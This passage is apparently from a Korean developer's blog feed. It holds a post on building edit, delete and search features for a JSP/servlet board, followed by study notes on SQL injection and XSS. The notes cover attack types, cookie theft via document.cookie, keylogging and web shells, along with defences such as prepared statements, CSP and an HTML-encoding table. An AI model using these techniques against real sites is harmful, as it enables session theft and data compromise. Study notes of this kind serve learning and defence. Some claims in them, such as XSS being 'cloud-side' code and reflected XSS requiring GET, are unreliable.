<p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/b1a6850c-b07e-4c20-826c-2224bccda626" alt="Pasted image 20230510145616" /></p>

<h3 id="수정하기-페이지">수정하기 페이지</h3>
<ul>
  <li>수정하기 버튼을 클릭하면 글을 수정할 수 있는 페이지가 나타난다.</li>
  <li>해당 페이지에는 현재 게시글의 제목과 본문이 적혀있다.</li>
  <li>내용을 수정하고 저장 버튼을 누르면 게시글을 수정할 수 있다.</li>
  <li>게시글 수정 페이지는 게시글 새로 작성하기와 코드가 동일하다. 단지 옛 게시글을 가져와 표시해준다.</li>
</ul>

<p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/4652763b-44fc-4699-b1ce-6dcacab8f204" alt="Pasted image 20230510150536" /></p>

<h3 id="게시글-수정-저장-과정">게시글 수정 저장 과정</h3>
<ol>
  <li>자기가 쓴 글의 수정하기 페이지에 들어간다.</li>
  <li>내용을 수정하고 저장 버튼을 누른다.</li>
  <li>서버에서 옛날에 쓴 게시글은 삭제하고 새로운 게시글 형태로 저장한다.</li>
</ol>

<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-ICDshJzrsoQgOiDsiJjsoJUg7KCV67O0IOyghOuLrFxu7ISc67KEIC0-PiDshJzrsoQgOiDsiJjsoJUg7JqU7LKt7J6Q7JmAIOqyjOyLnOq4gCDsoIDsnpDqsIAg7J287LmY7ZWY64qU7KeAIO2ZleyduFxu7ISc67KEIC0-PiBEQiDshJzrsoQgOiDsmJsg6rKM7Iuc6riAIOyCreygnCDsmpTssq1cbkRCIOyEnOuyhCAtPj4g7ISc67KEIDog7JmE66OMXG7shJzrsoQgLT4-IERCIOyEnOuyhCA6IOyDiOuhnOyatCDqsozsi5zquIAg7KCA7J6lIOyalOyyrVxuREIg7ISc67KEIC0-PiDshJzrsoQgOiDsmYTro4xcbuyEnOuyhCAtPj4g7IKs7Jqp7J6QIDog6rKM7Iuc6riAIO2OmOydtOyngOuhnCDrpqzri6TsnbTroIntirgiLCJtZXJtYWlkIjpudWxsfQ" /></p>

<h3 id="게시글-수정-전">게시글 수정 전</h3>
<p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/5c185a23-00ed-4809-85fa-7cbef5849e37" alt="Pasted image 20230510172026" /></p>

<h3 id="게시글-수정-후">게시글 수정 후</h3>
<p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/252dcf4a-f525-4b23-8163-fa613dcc1e6a" alt="Pasted image 20230510172058" /></p>

<h2 id="게시글-삭제">게시글 삭제</h2>
<ul>
  <li>자기가 쓴 글만 삭제가 가능하다.</li>
  <li><code class="language-plaintext highlighter-rouge">삭제하기</code>버튼을 누르면 게시글이 삭제된다.</li>
  <li><code class="language-plaintext highlighter-rouge">삭제하기</code>버튼은 자기가 쓴 게시글에만 표시가 된다.</li>
</ul>

<p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/aa96aad4-ecec-40e3-a2bb-6d3d6f14a101" alt="Pasted image 20230510145618" /></p>

<h3 id="게시글-삭제-과정">게시글 삭제 과정</h3>
<ol>
  <li>자기가 쓴 게시글을 클릭하여 들어간다.</li>
  <li>삭제하기 버튼을 클릭한다.</li>
  <li>서버에서 게시글을 삭제한다.</li>
</ol>

<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IOqyjOyLnOq4gCDsgq3soJwg7JqU7LKtXG7shJzrsoQgLT4-IOyEnOuyhCA6IOyCreygnCDsmpTssq3snpDsmYAg6rKM7Iuc6riAIOyggOyekOqwgCDsnbzsuZjtlZjripTsp4Ag7ZmV7J24XG7shJzrsoQgLT4-IERCIOyEnOuyhCA6IOqyjOyLnOq4gCDsgq3soJwg7JqU7LKtXG5EQiDshJzrsoQgLT4-IOyEnOuyhCA6IOyZhOujjFxu7ISc67KEIC0-PiDsgqzsmqnsnpAgOiDqsozsi5zquIAg66qp66GdIO2OmOydtOyngOuhnCDrpqzri6TsnbTroIntirgiLCJtZXJtYWlkIjpudWxsfQ" /></p>

<h3 id="게시글-삭제-전-db">게시글 삭제 전 DB</h3>
<p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/217f8cbe-2ba0-4523-8b8d-89735152c7c6" alt="Pasted image 20230510180241" /></p>

<h3 id="게시글-삭제-후-db">게시글 삭제 후 DB</h3>
<p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/29ca56bc-0173-4c34-a922-c21dce25d277" alt="Pasted image 20230510180336" /></p>

<h2 id="게시글-검색">게시글 검색</h2>
<ul>
  <li>제목 또는 본문에 일치하는 문장이 존재하면 게시글 목록에 나타난다.<br />
<img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/489ecabe-e9e2-47a6-b49b-2fb791f72dd9" alt="Pasted image 20230510180753" /></li>
</ul>

<h3 id="게시글-검색-과정">게시글 검색 과정</h3>
<ol>
  <li>검색바에 검색할 문장을 적어준다.</li>
  <li>엔터키를 눌러주면 서버로 검색 문장이 전송된다.</li>
  <li>서버에서 검색 문장과 일치하는 목록을 찾아 게시판 페이지를 완성하여 사용자에게 보내준다.</li>
</ol>

<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IOusuOyepeydhCDqsoDsg4ntlZzri6QuXG7shJzrsoQgLT4-IERCIOyEnOuyhCA6IOusuOyepeydtCDrk6TslrTqsIDripQg6rKM7Iuc7YyQIOuqqeuhneydhCDsmpTssq3tlZzri6QuXG5EQiDshJzrsoQgLT4-IOyEnOuyhCA6IOqyjOyLnO2MkCDrqqnroZ0g7J2R64u1Llxu7ISc67KEIC0-PiDshJzrsoQgOiDqsozsi5ztjJAg7Y6Y7J207KeAIOyZhOyEsS5cbuyEnOuyhCAtPj4g7IKs7Jqp7J6QIDog6rKM7Iuc7YyQIO2OmOydtOyngCDsnZHri7UuIiwibWVybWFpZCI6bnVsbH0" /></p>

<h3 id="게시판-검색-전">게시판 검색 전</h3>
<p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/b363eda5-a151-46d4-a4f1-3bcb6ed13cf5" alt="Pasted image 20230510182928" /></p>

<h3 id="게시판-검색-후">게시판 검색 후</h3>
<p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/e3aa24d0-93b3-40a2-83f0-6ab06983cfe7" alt="Pasted image 20230510182949" /></p>

<h2 id="코드">코드</h2>
<h3 id="jsp">JSP</h3>
<ul>
  <li>
    <p>notice.jsp 의 <code class="language-plaintext highlighter-rouge">수정하기</code> 및  <code class="language-plaintext highlighter-rouge">삭제하기</code> 버튼 부분.
<script src="https://gist.github.com/MinGyu2/39f0c8de5f8a66a31630dbeb16915406.js"></script></p>
  </li>
  <li>
    <p>notice_write.jsp 게시글 수정하기.
<script src="https://gist.github.com/MinGyu2/478e9223926016d77ec87888e6f62f27.js"></script></p>
  </li>
</ul>

<h3 id="servlet">Servlet</h3>
<ul>
  <li>
    <p>MainPage.java 의 <code class="language-plaintext highlighter-rouge">uriSearch</code> 함수의 게시글 수정하기 페이지.
<script src="https://gist.github.com/MinGyu2/ee292b560cc05e016493d920407ef2dc.js"></script></p>
  </li>
  <li>
    <p>MainPage.java 의 <code class="language-plaintext highlighter-rouge">uriSearch</code> 함수의 게시글 수정본 저장하기 버튼 눌렀을 때. 
<script src="https://gist.github.com/MinGyu2/d0fa86e9427cd19756eda75cf947b229.js"></script></p>
  </li>
  <li>
    <p>MainPage.java 의 <code class="language-plaintext highlighter-rouge">uriSearch</code> 함수의 게시글 삭제하기 버튼 눌렀을 때.
<script src="https://gist.github.com/MinGyu2/20a4a375485e9aa2d629c11278935f94.js"></script></p>
  </li>
  <li>
    <p>MainPage.java 의 <code class="language-plaintext highlighter-rouge">uriSearch</code> 함수의 게시글 검색하기 버튼 눌렀을 때.
<script src="https://gist.github.com/MinGyu2/2e7bb12c785988dd7e4245d4e39d9387.js"></script></p>
  </li>
</ul>

<h2 id="웹-서버-전체-코드">웹 서버 전체 코드</h2>
<h3 id="jsp-1">JSP</h3>
<ul>
  <li><a href="https://github.com/MinGyu2/myWeb">MinGyu2/myWeb (github.com)</a></li>
</ul>

<h3 id="servlet-1">servlet</h3>
<ul>
  <li><a href="https://github.com/MinGyu2/MyHomePage">MinGyu2/MyHomePage (github.com)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="jsp" /><category term="servlet" /><category term="웹 서버" /><summary type="html"><![CDATA[게시글 수정, 삭제, 검색 기능 만들기.]]></summary></entry><entry><title type="html">SQL Injection 정리</title><link href="http://localhost:4000/SQLi%EC%A0%95%EB%A6%AC/" rel="alternate" type="text/html" title="SQL Injection 정리" /><published>2023-05-08T00:00:00+09:00</published><updated>2023-05-08T23:13:00+09:00</updated><id>http://localhost:4000/SQLi%EC%A0%95%EB%A6%AC</id><content type="html" xml:base="http://localhost:4000/SQLi%EC%A0%95%EB%A6%AC/"><![CDATA[<h2 id="sql-injection">SQL Injection</h2>

<h3 id="개념">개념</h3>
<ul>
  <li>임의의 SQL 질의문을 삽입해 실행하는 공격이다.</li>
</ul>

<h3 id="공격-피해">공격 피해</h3>

<h4 id="인증-우회">인증 우회</h4>
<ul>
  <li>입력에 SQL 질의문을 삽입하여 인증 우회를 한다.</li>
  <li>사용자가 입력한 값이 별도의 검증 과정 없이 서버의 SQL 문과 합쳐져 발생하는 문제이다.</li>
</ul>

<h4 id="데이터-추출">데이터 추출</h4>
<ul>
  <li>공격자가 원하는 정보를 DB에서 읽어올 수 있다.</li>
  <li>사용자가 입력한 값이 별도의 검증 과정 없이 서버의 SQL 문과 합쳐져 발생하는 문제이다.</li>
</ul>

<h4 id="데이터-변조">데이터 변조</h4>
<ul>
  <li>insert, delete, update 구문을 이용하여 DB 서버에 저장된 데이터를 변화시킨다.</li>
  <li>사용자가 입력한 값이 별도의 검증 과정 없이 서버의 SQL 문과 합쳐져 발생하는 문제이다.</li>
</ul>

<h4 id="web-shell">Web Shell</h4>
<ul>
  <li>업로드 취약점을 통하여 시스템에 명령을 내릴수 있는 코드를 말한다.</li>
  <li>SQL Injection 공격을 통해 악성코드를 업로드할 수 있다.</li>
  <li>하지만 웹 서버와 DB 서버가 물리적으로 분리되어 있다면 악성코드를 실행하기 힘들다.</li>
</ul>

<h3 id="공격-유형">공격 유형</h3>

<h4 id="union-sqli">Union SQLi</h4>
<ul>
  <li>union 문을 이용하여 select 문을 추가하고, 결과를 받아본다.</li>
</ul>

<h4 id="error-based-sqli">Error Based SQLi</h4>
<ul>
  <li>논리에러를 유발시킬 수 있는 특정 함수를 이용한다.</li>
</ul>

<h4 id="blind-sqli">Blind SQLi</h4>
<ul>
  <li>참과 거짓 조건을 이용해서 데이터 문자 하나씩 추출한다.</li>
</ul>

<h3 id="대응-방안">대응 방안</h3>
<ul>
  <li>Prepared Statement 를 이용하기. 단 order by, table 이름, column 이름에는 적용할 수 없다.</li>
  <li>화이트 리스트 필터링.(허락. 더 안전하다. ) 즉 정해놓은 애들만 들어올 수 있다.</li>
  <li>블랙 리스트 필터링. (금지) 금지한 명령어는 사용할 수 없다.</li>
</ul>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://ko.wikipedia.org/wiki/%EC%9B%B9_%EC%85%B8">웹 셸 - 위키백과, 우리 모두의 백과사전 (wikipedia.org)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="SQL Injection" /><summary type="html"><![CDATA[SQL Injection 간단하게 정리해보자.]]></summary></entry><entry><title type="html">XSS 이론</title><link href="http://localhost:4000/XSS%EC%9D%B4%EB%A1%A0/" rel="alternate" type="text/html" title="XSS 이론" /><published>2023-05-07T00:00:00+09:00</published><updated>2023-05-12T23:13:00+09:00</updated><id>http://localhost:4000/XSS%EC%9D%B4%EB%A1%A0</id><content type="html" xml:base="http://localhost:4000/XSS%EC%9D%B4%EB%A1%A0/"><![CDATA[<h2 id="xss">XSS</h2>
<h3 id="개념">개념</h3>
<ul>
  <li>클라우드 측 코드를 삽입하는 공격이다.</li>
  <li>클라이언트의 브라우저에서 실행된다.</li>
  <li>피해자 컴퓨터(브라우저)에 악의적인 코드를 실행되게 하는 공격이다.</li>
  <li>Cross-site Scripting 의 약자이다.</li>
  <li>개발자가 고려하지 않는 기능을 동작시킨다.</li>
</ul>

<h3 id="poc-코드">POC 코드</h3>
<ul>
  <li>alert(1)</li>
  <li>console.log()</li>
  <li>“임이의 클라이언트 측 코드가 동작한다.” 를 보여주면 된다.</li>
</ul>

<h3 id="공격-방식">공격 방식</h3>
<h4 id="script-태그-이용하기">script 태그 이용하기.</h4>
<script src="https://gist.github.com/MinGyu2/ba046742127493f07bd950b19c8cd123.js"></script>

<h4 id="onerror-속성-이용하기">onerror 속성 이용하기.</h4>
<ul>
  <li>자바스크립트 태그 안에 있는 효과와 동일하다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/94420c775fba67aeb3ff11335bc32fa0.js"></script>

<h3 id="공격-피해">공격 피해</h3>

<h4 id="사용자-쿠키-탈취">사용자 쿠키 탈취</h4>
<ul>
  <li>document.cookie 를 활용하여 사용자 쿠키 값을 훔친다.</li>
  <li>사용자 브라우저의 쿠키에 저장된 합법적인 <strong>Session ID 값</strong>이나 <strong>액세스 토큰 값</strong>을 훔쳐 원격지 서버로 전송한다.</li>
</ul>

<h4 id="사용자-개인정보-탈취">사용자 개인정보 탈취</h4>
<ul>
  <li>Key Logger 방식으로 사용자 입력을 탈취한다.</li>
  <li>XSS Keylog 가 삽입된 페이지에 사용자가 접근하면 Keyboard Event 를 통해 입력 값을 후킹한다.</li>
  <li>후킹한 값을 원격지 서버로 전송한다.</li>
</ul>

<h4 id="악성코드-다운로드">악성코드 다운로드</h4>
<ul>
  <li>사용자가 악성 스크립트가 있는 URL을 클릭하도록 유도하여 악성 프로그램 다운로드 받는 사이트로 리타이렉한다.</li>
  <li>사용자가 악성 프로그램을 다운로드 하도록 유도한다.</li>
</ul>

<h4 id="피싱-사이트-강제-이동">피싱 사이트 강제 이동</h4>
<ul>
  <li>가짜 사이트로 위장하여 사용자의 로그인 정보를 탈취한다.</li>
  <li>실제 사이트와 유사한 웹 페이지를 통해 사용자의 개인정보를 훔쳐올 수 있다.</li>
</ul>

<h3 id="공격-유형">공격 유형</h3>

<h4 id="stored-xss--서버에-저장하기-">Stored XSS ( 서버에 저장하기 )</h4>

<h5 id="설명">설명</h5>
<ul>
  <li>비정상적인 방법이 아니라 서버에서 제공하는 서비스의 취약점을 이용한 것이다.</li>
  <li>공격자가 악성 스크립트를 서버 페이지에 저장하고 해당 페이지를 사용자에게 노출 시킨다.</li>
  <li>사용자가 악성 스크립트가 들어있는 페이지를 방문하면 악성 스크립트가 사용자 브라우저에서 실행된다.</li>
  <li>광역적으로 공격이 가능하다. 하지만 흔적이 남는다.</li>
</ul>

<h5 id="유형">유형</h5>
<ul>
  <li>댓글</li>
  <li>게시판</li>
  <li>이메일</li>
  <li>블로그 포스</li>
  <li>채팅방의 유저 이름</li>
</ul>

<h5 id="과정">과정</h5>
<ol>
  <li>XSS 취약점이 있는 게시판에 쿠키 정보를 탈취하기 위한 악성 스크립트를 포함한 게시물을 작성한다.</li>
  <li>사용자가 해당 글 열람 시 사용자의 쿠키 정보가 공격자에게 전송된다.</li>
  <li>공격자가 사용자의 쿠키정보를 이용하여 사이트에 접근한다.</li>
</ol>

<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7qs7XqsqnsnpAgLT4-IOyEnOuyhCA6IOyVheyEsSDsiqTtgazrpr3tirjrpbwg64Sj7J2AIOqyjOyLnOq4gOydhCDsnpHshLHtlZzri6QuXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IOyVheyEsSDsiqTtgazrpr3tirjqsIAg7J6I64qUIOqyjOyLnOq4gOydhCDsmpTssq3tlZzri6QuXG7shJzrsoQgLT4-IOyCrOyaqeyekCA6IOyVheyEsSDsiqTtgazrpr3tirjqsIAg7J6I64qUIOqyjOyLnOq4gOydhCDsnZHri7XtlZzri6QuXG7sgqzsmqnsnpAgLT4-IOyCrOyaqeyekCA6IOyVheyEsSDsiqTtgazrpr3tirjqsIAg64-Z7J6R7ZWc64ukLlxu7IKs7Jqp7J6QIC0-PiDqs7XqsqnsnpAgOiDrr7zqsJDtlZwg642w7J207YSwIOyghOyGoe2VnOuLpC4iLCJtZXJtYWlkIjpudWxsfQ" /></p>

<h4 id="reflected-xss">Reflected XSS</h4>

<h5 id="설명-1">설명</h5>
<ul>
  <li>서버 사이드 렌더링(SSR)</li>
  <li>무조건 GET 방식 이여야 한다.</li>
  <li>악성 스크립트가 담긴 URL을 만들어 일반 사용자에게 전달한다.</li>
  <li>URL 주소 뒤에 붙는 쿼리에 악성 스크립트를 작성하여 전달한다.</li>
  <li>사용자가 공격자가 건네준 URL을 클릭하여 방문하면 악성 스크립트가 담긴 페이지를 사용자에게 보여준다. 그리고 사용자 브라우저에서 악성 스크립트가 실행된다.</li>
</ul>

<h5 id="유형-1">유형</h5>
<ul>
  <li>이메일</li>
</ul>

<h5 id="과정-1">과정</h5>
<ol>
  <li>XSS 취약한 서버 URL와 악성 스크립트를 합쳐서 만든 링크를 사용자에게 보낸다.</li>
  <li>사용자가 링크를 클릭하면 취약한 서버에 악성 스크립트랑 같이 요청을 보낸다.</li>
  <li>사용자는 서버로 부터 응답을 받는다. 이때 받은 페이지는 서버에서 완성된 페이지이고 악성 스크립트가 담겨져 있다.</li>
  <li>사용자 브라우저는 악성 스크립트를 동작시킨다.</li>
  <li>공격자는 사용자의 민감한 정보를 훔칠 수 있다.</li>
</ol>

<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7qs7XqsqnsnpAgLT4-IOyCrOyaqeyekCA6IFVSTCArIOyVheyEsSDsiqTtgazrpr3tirjsnYQg67O064K464ukLlxu7IKs7Jqp7J6QIC0-PiDsgqzsmqnsnpAgOiBVUkzsnYQg7YG066at7ZWc64ukLlxu7IKs7Jqp7J6QIC0-PiDshJzrsoQgOiDtjpjsnbTsp4Drpbwg7JqU7LKt7ZWc64ukLlxu7ISc67KEIC0-PiDshJzrsoQgOiDslYXshLEg7Iqk7YGs66a97Yq466W8IOuEo-ydgCDtjpjsnbTsp4Drpbwg7JmE7ISxIOyLnO2CqOuLpC5cbuyEnOuyhCAtPj4g7IKs7Jqp7J6QIDog7Y6Y7J207KeA66W8IOydkeuLte2VnOuLpC5cbuyCrOyaqeyekCAtPj4g7IKs7Jqp7J6QIDog7JWF7ISxIOyKpO2BrOumve2KuOqwgCDrj5nsnpHtlZzri6QuXG7sgqzsmqnsnpAgLT4-IOqzteqyqeyekCA6IOuvvOqwkO2VnCDrjbDsnbTthLDrpbwg7KCE7Iah7ZWc64ukLiIsIm1lcm1haWQiOm51bGx9" /></p>

<h4 id="dom-based-xss">DOM Based XSS</h4>

<h5 id="설명-2">설명</h5>
<ul>
  <li>클라이언트 사이드 렌더링(CSR)</li>
  <li>JavaScript 코드로 DOM 객체를 제어하는 과정에서 발생한다.</li>
  <li>악성 스크립트가 서버로 전송되지 않고, 브라우저에서 동적으로 동작한다.</li>
  <li>웹 사이트 코드를 조사하지 않고는 취약점을 발견할 수 없다. 따라서 공격 당하기 쉽다.</li>
  <li>url에 사용자가 접근할 경우 서버와의 상호작용 없이 브라우저에서 악성 스크립트가 실행된다.</li>
  <li>DOM 이 만들어지고 화면에 렌더링 된 이후, 악성 스크립트 코드에 의해 DOM 구조가 동적으로 바뀐다.</li>
</ul>

<h5 id="과정-2">과정</h5>
<ol>
  <li>악성 스크립트가 실행되도록 URL 주소를 만들어 사용자에게 전달한다.</li>
  <li>사용자는 링크를 클릭하여 서버에 페이지를 요청하고 서버는 사용자에게 페이지를 넘겨준다.</li>
  <li>서버로부터 받은 페이지를 사용자가 읽을 때 사용자 브라우저에서 악성 스크립트를 동작 시킨다.</li>
  <li>사용자 브라우저에서 페이지 구조를 동적으로 변경한다.</li>
  <li>사용자는 공격자에게 민감한 데이터를 전송한다.</li>
</ol>

<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7qs7XqsqnsnpAgLT4-IOyCrOyaqeyekCA6IFVSTCArIOyVheyEsSDsiqTtgazrpr3tirjrpbwg7KCE64us7ZWc64ukLlxu7IKs7Jqp7J6QIC0-PiDsgqzsmqnsnpAgOiBVUkzsnYQg7YG066at7ZWc64ukLlxu7IKs7Jqp7J6QIC0-PiDshJzrsoQgOiDtjpjsnbTsp4Drpbwg7JqU7LKt7ZWc64ukLlxu7ISc67KEIC0-PiDsgqzsmqnsnpAgOiDtjpjsnbTsp4Drpbwg7J2R64u17ZWc64ukLlxu7IKs7Jqp7J6QIC0-PiDsgqzsmqnsnpAgOiDslYXshLEg7Iqk7YGs66a97Yq47JeQIOydmO2VtCDtjpjsnbTsp4Ag6rWs7KGw6rCAIOuPmeyggeycvOuhnCDrs4DtlZzri6QuXG7sgqzsmqnsnpAgLT4-IOqzteqyqeyekCA6IOuvvOqwkO2VnCDrjbDsnbTthLDrpbwg7KCE7Iah7ZWc64ukLiIsIm1lcm1haWQiOm51bGx9" /></p>

<h3 id="대응-방안">대응 방안</h3>
<ul>
  <li>신뢰할 수 없는 사이트, 메일을 피해야한다.</li>
  <li>콘텐츠 보안 정(CSP) 사용한다. 스크립트 실행에 대한 정책을 설정하여 예방한다.</li>
  <li>HTTP 응답에 유저가 입력한 데이터가 존재한다면 입력한 데이터를 인코딩 해야 한다.</li>
  <li>입력에 필터를 적용해야 한다. 즉 어떤 데이터 유효하고 예상되는 입력인지 확인한다. 특수 문자를 단순 문자로 인식하게 한다.</li>
</ul>

<h4 id="xss-필터링">XSS 필터링</h4>

<table>
  <thead>
    <tr>
      <th>문자</th>
      <th>인코딩 된 문자</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">&amp;</code></td>
      <td><code class="language-plaintext highlighter-rouge">&amp;amp;</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">&lt;</code></td>
      <td><code class="language-plaintext highlighter-rouge">&amp;lt;</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">&gt;</code></td>
      <td><code class="language-plaintext highlighter-rouge">&amp;gt;</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">'</code></td>
      <td><code class="language-plaintext highlighter-rouge">&amp;#x27;</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">"</code></td>
      <td><code class="language-plaintext highlighter-rouge">&amp;quot;</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">(</code></td>
      <td><code class="language-plaintext highlighter-rouge">&amp;#40;</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">)</code></td>
      <td><code class="language-plaintext highlighter-rouge">&amp;#41;</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">/</code></td>
      <td><code class="language-plaintext highlighter-rouge">&amp;#x2F;</code></td>
    </tr>
  </tbody>
</table>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://junhyunny.github.io/information/security/spring-mvc/stored-cross-site-scripting/">저장형 XSS(Stored Cross Site Scripting) 공격과 방어 - Junhyunny’s Devlogs</a></li>
  <li><a href="https://zidarn87.tistory.com/217">토픽 스터디 / 정보보안 / XSS(Cross Site Scripting) 공격 - 해킹</a></li>
  <li><a href="https://velog.io/@ckdwns9121/%ED%86%A0%ED%81%B0token%EC%9D%80-%EC%96%B4%EB%96%BB%EA%B2%8C-%ED%83%88%EC%B7%A8-%EB%8B%B9%ED%95%98%EB%8A%94%EA%B0%80">토큰(token)은 어떻게 탈취 당하는가? (velog.io)</a></li>
  <li><a href="https://portswigger.net/web-security/cross-site-scripting">What is cross-site scripting (XSS) and how to prevent it?</a></li>
  <li><a href="https://dar0m.tistory.com/227">XSS(Cross-site Scripting) 공격 (tistory.com)</a></li>
  <li><a href="https://4rgos.tistory.com/1">XSS(Cross Site Scripting) 공격이란? :: ARGOS (tistory.com)</a></li>
  <li><a href="https://nordvpn.com/ko/blog/xss-attack/#head3-3">크로스 사이트 스크립팅의 정의 및 공격 유형 NordVPN</a></li>
  <li><a href="https://namu.wiki/w/XSS">XSS - 나무위키 (namu.wiki)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="XSS" /><category term="웹 해킹" /><summary type="html"><![CDATA[XSS 개념 클라우드 측 코드를 삽입하는 공격이다. 클라이언트의 브라우저에서 실행된다. 피해자 컴퓨터(브라우저)에 악의적인 코드를 실행되게 하는 공격이다. Cross-site Scripting 의 약자이다. 개발자가 고려하지 않는 기능을 동작시킨다.]]></summary></entry></feed>